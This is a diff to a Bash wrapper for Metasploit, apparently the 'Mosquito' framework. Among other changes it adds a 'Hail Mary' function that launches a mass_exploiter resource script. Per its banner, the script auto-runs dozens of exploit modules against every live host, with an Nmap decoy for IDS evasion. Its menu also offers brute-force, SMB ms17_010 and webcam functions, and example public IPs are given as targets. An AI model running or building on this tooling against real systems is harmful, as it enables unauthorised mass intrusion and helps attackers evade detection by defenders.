@@ -201,10 +201,10 @@ sh_one () {
       packag=$(zenity --list --title "🦟 MOSQUITO 🦟" --text "Sellect geolocation package" --radiolist --column "Pick" --column "Option" TRUE "Curl" FALSE "geoiplookup" --width 328 --height 175) > /dev/null 2>&1
          if [ "$packag" = "Curl" ]; then
             echo "${BlueF}[☠]${white} Using curl package to resolve"${Reset};
-            msfconsole -q -x "workspace -a mosquito;setg USE_CURL true;setg RHOSTS $rhost;resource geo_location.rc;workspace -d mosquito"
+            msfconsole -q -x "setg USE_CURL true;setg RHOSTS $rhost;resource geo_location.rc"
          else
             echo "${BlueF}[☠]${white} Using geoiplookup package to resolve"${Reset};
-            msfconsole -q -x "workspace -a mosquito;setg GOOGLE_MAP true;setg RHOSTS $rhost;resource geo_location.rc;workspace -d mosquito"
+            msfconsole -q -x "setg GOOGLE_MAP true;setg RHOSTS $rhost;resource geo_location.rc"
          fi
    #
    # Scan user input host list (file.txt)
@@ -215,10 +215,10 @@ sh_one () {
       packag=$(zenity --list --title "🦟 MOSQUITO 🦟" --text "Sellect geolocation package" --radiolist --column "Pick" --column "Option" TRUE "Curl" FALSE "geoiplookup" --width 328 --height 175) > /dev/null 2>&1
          if [ "$packag" = "Curl" ]; then
             echo "${BlueF}[☠]${white} Using curl package to resolve"${Reset};
-            msfconsole -q -x "workspace -a mosquito;setg USE_CURL true;setg TXT_IMPORT $list;resource geo_location.rc;workspace -d mosquito"
+            msfconsole -q -x "setg USE_CURL true;setg TXT_IMPORT $list;resource geo_location.rc"
          else
             echo "${BlueF}[☠]${white} Using geoiplookup package to resolve"${Reset};
-            msfconsole -q -x "workspace -a mosquito;setg GOOGLE_MAP true;setg TXT_IMPORT $list;resource geo_location.rc;workspace -d mosquito"
+            msfconsole -q -x "setg GOOGLE_MAP true;setg TXT_IMPORT $list;resource geo_location.rc"
          fi
    #
    # Internal ip addr to external ip Resolver (dig)
@@ -228,15 +228,16 @@ sh_one () {
       packag=$(zenity --list --title "🦟 MOSQUITO 🦟" --text "Sellect geolocation package" --radiolist --column "Pick" --column "Option" TRUE "Curl" FALSE "geoiplookup" --width 328 --height 175) > /dev/null 2>&1
          if [ "$packag" = "Curl" ]; then
             echo "${BlueF}[☠]${white} Using curl package to resolve"${Reset};
-            msfconsole -q -x "workspace -a mosquito;setg USE_CURL true;setg RESOLVER true;resource geo_location.rc;workspace -d mosquito"
+            msfconsole -q -x "setg USE_CURL true;setg RESOLVER true;resource geo_location.rc"
          else
             echo "${BlueF}[☠]${white} Using geoiplookup package to resolve"${Reset};
-            msfconsole -q -x "workspace -a mosquito;setg GOOGLE_MAP true;setg RESOLVER true;resource geo_location.rc;workspace -d mosquito"
+            msfconsole -q -x "setg GOOGLE_MAP true;setg RESOLVER true;resource geo_location.rc"
          fi
    else
       echo "${BlueF}[${RedF}x${BlueF}]${white} None option sellected, aborting 🦟Bzzzz.."${Reset};
       sleep 2 && sh_main
    fi
+sh_main
 }
 
 
@@ -284,6 +285,7 @@ sh_two () {
       echo "${BlueF}[${RedF}x${BlueF}]${white} None option sellected, aborting 🦟Bzzzz.."${Reset};
       sleep 2 && sh_main
    fi
+sh_main
 }
 
 
@@ -332,6 +334,7 @@ sh_tree () {
       echo "${BlueF}[${RedF}x${BlueF}]${white} None option sellected, aborting 🦟Bzzzz.."${Reset};
       sleep 2 && sh_main
    fi
+sh_main
 }
 
 
@@ -377,6 +380,7 @@ sh_quatro () {
       echo "${BlueF}[${RedF}x${BlueF}]${white} None option sellected, aborting 🦟Bzzzz.."${Reset};
       sleep 2 && sh_main
    fi
+sh_main
 }
 
 
@@ -424,6 +428,7 @@ sh_cinco () {
       echo "${BlueF}[${RedF}x${BlueF}]${white} None option sellected, aborting 🦟Bzzzz.."${Reset};
       sleep 2 && sh_main
    fi
+sh_main
 }
 
 
@@ -470,6 +475,7 @@ sh_six () {
       echo "${BlueF}[${RedF}x${BlueF}]${white} None option sellected, aborting 🦟Bzzzz.."${Reset};
       sleep 2 && sh_main
    fi
+sh_main
 }
 
 
@@ -517,6 +523,7 @@ sh_seven () {
       echo "${BlueF}[${RedF}x${BlueF}]${white} None option sellected, aborting 🦟Bzzzz.."${Reset};
       sleep 2 && sh_main
    fi
+sh_main
 }
 
 
@@ -563,6 +570,7 @@ sh_oito () {
       echo "${BlueF}[${RedF}x${BlueF}]${white} None option sellected, aborting 🦟Bzzzz.."${Reset};
       sleep 2 && sh_main
    fi
+sh_main
 }
 
 
@@ -609,6 +617,7 @@ sh_nine () {
       echo "${BlueF}[${RedF}x${BlueF}]${white} None option sellected, aborting 🦟Bzzzz.."${Reset};
       sleep 2 && sh_main
    fi
+sh_main
 }
 
 
@@ -655,6 +664,7 @@ sh_ten () {
       echo "${BlueF}[${RedF}x${BlueF}]${white} None option sellected, aborting 🦟Bzzzz.."${Reset};
       sleep 2 && sh_main
    fi
+sh_main
 }
 
 
@@ -701,6 +711,7 @@ sh_onze () {
       echo "${BlueF}[${RedF}x${BlueF}]${white} None option sellected, aborting 🦟Bzzzz.."${Reset};
       sleep 2 && sh_main
    fi
+sh_main
 }
 
 
@@ -747,6 +758,7 @@ sh_twelve () {
       echo "${BlueF}[${RedF}x${BlueF}]${white} None option sellected, aborting 🦟Bzzzz.."${Reset};
       sleep 2 && sh_main
    fi
+sh_main
 }
 
 
@@ -793,6 +805,7 @@ sh_treze () {
       echo "${BlueF}[${RedF}x${BlueF}]${white} None option sellected, aborting 🦟Bzzzz.."${Reset};
       sleep 2 && sh_main
    fi
+sh_main
 }
 
 
@@ -837,6 +850,7 @@ sh_quatorze () {
       echo "${BlueF}[${RedF}x${BlueF}]${white} None option sellected, aborting 🦟Bzzzz.."${Reset};
       sleep 2 && sh_main
    fi
+sh_main
 }
 
 
@@ -849,14 +863,6 @@ IPADDR=`ifconfig $InT3R | egrep -w "inet" | awk {'print $2'}` # grab local ip ad
 scan=$(zenity --list --title "🦟 MOSQUITO 🦟" --text "Sellect scanning method" --radiolist --column "Pick" --column "Option" TRUE "Scan Local Lan (fast)" FALSE "Scan Local Lan (discovery)" FALSE "Scan Local Lan (vulns)" FALSE "Scan User Input Host(s)" --width 330 --height 220) > /dev/null 2>&1
 ## random database xml file generator
 rand=$(cat /dev/urandom | tr -dc 'a-zA-Z' | fold -w 6 | head -n 1)
-
-cat << !
-
-    ╔───────────────────────────────────────────────────────────────────────────╗
-    ║                          🦟 Nmap nse Quick Scans 🦟                       ║
-    ╚───────────────────────────────────────────────────────────────────────────╝
-
-!
 
    ## Scan Local Lan (fast)
    if [ "$scan" = "Scan Local Lan (fast)" ]; then
@@ -883,8 +889,95 @@ cat << !
       echo "${BlueF}[${RedF}x${BlueF}]${white} None option sellected, aborting 🦟Bzzzz.."${Reset};
       sleep 2 && sh_main
    fi
+sh_main
 }
 
+
+
+#
+# HAIL MARY (mass_exploiter.rc)
+#
+sh_hail_mary () {
+echo "${BlueF}[${YellowF}running${BlueF}]:${white} mass_exploiter resource_"${Reset};sleep 1
+## mass_exploiter banner
+echo "" && echo ""
+echo ${BlueF}"                 🦟 armitage Hail Mary (based) resource script 🦟"${Reset};
+cat << !
+                 ------------------------------------------------
+    mass_exploiter.rc resource script allow us to scan user inputs (rhosts/lhosts)
+    or import an database.xml file to msfdb and auto-run multiple exploit modules
+    againts all alive db hosts based on their port number(s) or service name(s).
+    'This module exploits ports: 21:22:23:80:110:139:445:1433:3306:3389:8080:55553'
+    'And Loads [46] exploits and [11] auxiliarys scanners in MAX_PORTS scan mode'
+
+
+!
+echo -n "${BlueF}[${YellowF}?${BlueF}]${white} Execute mass_exploiter.rc script? (y/n)${RedF}:${white}"${Reset};read question
+if [ "$question" = "y" ] || [ "$question" = "Y" ]; then
+
+## Local variable declarations
+IPADDR=`ifconfig $InT3R | egrep -w "inet" | awk {'print $2'}` # grab local ip address
+scan=$(zenity --list --title "🦟 MOSQUITO 🦟" --text "Sellect scanning method" --radiolist --column "Pick" --column "Option" TRUE "Scan user input rhosts" FALSE "Import database.xml (rhosts)" FALSE "Suggest exploits (dont exploit)" --width 320 --height 210) > /dev/null 2>&1
+if [ "$scan" = "Import database.xml (rhosts)" ]; then
+   dbx=$(zenity --title "🦟 MOSQUITO 🦟" --filename=$IPATH --file-selection --text "chose database.xml file to import") > /dev/null 2>&1
+elif [ "$scan" = "Suggest exploits (dont exploit)" ]; then
+  :
+else
+   rhost=$(zenity --entry --title "🦟 MOSQUITO 🦟" --text "Input rhosts separated by blank spaces\nExample: 117.2.40.217 45.32.87.101" --width 450) > /dev/null 2>&1
+fi
+
+if ! [ "$scan" = "Suggest exploits (dont exploit)" ]; then
+scan_max=$(zenity --list --title "🦟 MOSQUITO 🦟" --text "Scan MAX number of ports or regular scan?\nWARNING: Scanning MAX ports it will take longer." --radiolist --column "Pick" --column "Option" TRUE "Scan default ports (fast)" FALSE "Scan MAX number of ports" --width 330 --height 180) > /dev/null 2>&1
+   if [ "$scan_max" = "Scan default ports (fast)" ]; then
+      max_value="false"
+   else
+      max_value="true"
+   fi
+decoy=$(zenity --list --title "🦟 MOSQUITO 🦟" --text "Nmap IDS evasion decoy technic" --radiolist --column "Pick" --column "Option" TRUE "Use www.apple.org decoy (default)" FALSE "Manualy set the 2º decoy ip addr" --width 320 --height 180) > /dev/null 2>&1
+fi
+
+   #
+   # scanning user inputs
+   #
+   if [ "$scan" = "Scan user input rhosts" ]; then
+      echo "${BlueF}[☠]${white} Import user inputs (rhosts) to database."${Reset};      
+      # manualy set 2º decoy ip addr ?
+      if [ "$decoy" = "Use www.apple.org decoy (default)" ]; then
+         msfconsole -q -x "setg RHOSTS $rhost;setg LHOST $IPADDR;setg MAX_PORTS $max_value;resource mass_exploiter.rc"
+      else
+         msfconsole -q -x "setg SET_DECOY true;setg RHOSTS $rhost;setg LHOST $IPADDR;setg MAX_PORTS $max_value;resource mass_exploiter.rc"
+      fi
+
+   #
+   # suggest exploit modules
+   #
+   elif [ "$scan" = "Suggest exploits (dont exploit)" ]; then
+      echo "${BlueF}[${YellowF}running${BlueF}]:${white} mass_exploiter - exploit suggester."${Reset};
+      msfconsole -q -x "setg SUGGEST true;resource mass_exploiter.rc"
+
+   #
+   # Import database.xml file to msfdb
+   #
+   elif [ "$scan" = "Import database.xml (rhosts)" ]; then
+      echo "${BlueF}[☠]${white} Import database.xml (rhosts) to database."${Reset};
+      # manualy set 2º decoy ip addr ?
+      if [ "$decoy" = "Use www.apple.org decoy (default)" ]; then
+         msfconsole -q -x "setg IMPORT_DB $dbx;setg LHOST $IPADDR;setg MAX_PORTS $max_value;resource mass_exploiter.rc"
+      else
+         msfconsole -q -x "setg SET_DECOY true;setg IMPORT_DB $dbx;setg LHOST $IPADDR;setg MAX_PORTS $max_value;resource mass_exploiter.rc"
+      fi
+   ## None option sellected..aborting ..
+   else
+      echo "${BlueF}[${RedF}x${BlueF}]${white} None option sellected, aborting 🦟Bzzzz.."${Reset};
+      sleep 2 && sh_main
+   fi
+
+else
+   echo "${BlueF}[${RedF}x${BlueF}]${white} Aborting Module execution 🦟Bzzzz.."${Reset};
+   sleep 2 && sh_main
+fi
+sh_main
+}
 
 
 
@@ -946,60 +1039,63 @@ sleep 1
 echo -n "${BlueF}[${GreenF}➽${BlueF}]${white} Chose Option number${RedF}:${white}"${Reset};
 read choice
 case $choice in
-1)
+1|one|ONE)
     sh_one # geo_location function
 ;;
-2)
+2|two|TWO)
     sh_two # most common ports brute force function
 ;;
-3)
+3|three|THREE)
     sh_tree  # ms17_010 (smb) function
 ;;
-4)
+4|four|FOUR)
     sh_quatro  # SSH function
 ;;
-5)
+5|five|FIVE)
     sh_cinco  # FTP function
 ;;
-6)
+6|six|SIX)
     sh_six  # HTTP CVE function
 ;;
-7)
+7|seven|SEVEN)
     sh_seven  # WINRM snmp function
 ;;
-8)
+8|eight|EIGTH)
     sh_oito  # MYSQL  function
 ;;
-9)
+9|nine|NINE)
     sh_nine  # MSSQL function
 ;;
-10)
+10|ten|TEN)
     sh_ten  # TELNET function
 ;;
-11)
+11|eleven|ELEVEN)
     sh_onze  # RPC function
 ;;
-12)
+12|twelve|TWELVE)
     sh_twelve  # SNMP function
 ;;
-13)
+13|thirteen|THIRTEEN)
     sh_treze  # POSTGRES function
 ;;
-14)
+14|fourteen|FOURTEEN)
     sh_quatorze  # RTSP (webcams) function
 ;;
-n|N)
+n|N|nmap|NMAP)
     ## Mosquito Nmap nse quick scans
     # whitehat - search for vuln's/cve's in local lan
     sh_easter_egg
 ;;
-e|E)
+exp|expl|explo|exploi|exploit|Exploit|EXPLOIT)
+   sh_hail_mary # mass_exploiter.rc
+;;
+e|E|exit|EXIT)
     echo "${BlueF}[${YellowF}i${BlueF}]${white} Closing framework 🦟Bzzzz."${Reset};
     service postgresql stop | zenity --progress --pulsate --title "🦟 PLEASE WAIT 🦟" --text="Stoping postgresql service" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
 rm -f ip_range.txt > /dev/nul 2>&1
 exit
 ;;
-h|H)
+h|H|help|HELP)
     echo "${BlueF}[${YellowF}i${BlueF}] [${YellowF}EXECUTE${BlueF}] sudo ./mosquito.sh -h"${Reset};
     service postgresql stop | zenity --progress --pulsate --title "🦟 PLEASE WAIT 🦟" --text="Stoping postgresql service" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
 exit
